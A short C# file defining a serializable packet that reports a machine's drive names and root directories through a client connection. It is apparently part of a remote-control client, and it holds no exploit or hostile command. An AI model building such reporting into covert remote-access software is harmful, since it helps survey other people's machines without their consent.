using Client.Controllers;
using ZeroFormatter;

namespace Client.Packets.ClientPackets
{
    [ZeroFormattable]
    public class GetDrivesResponse : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetDrivesResponse;
            }
        }

        [Index(0)]
        public virtual string[] driveDisplayName { get; set; }

        [Index(1)]
        public virtual string[] rootDirectory { get; set; }

        public GetDrivesResponse()
        {
        }

        public GetDrivesResponse(string[] driveDisplayName, string[] rootDirectory)
        {
            this.driveDisplayName = driveDisplayName;
            this.rootDirectory = rootDirectory;
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
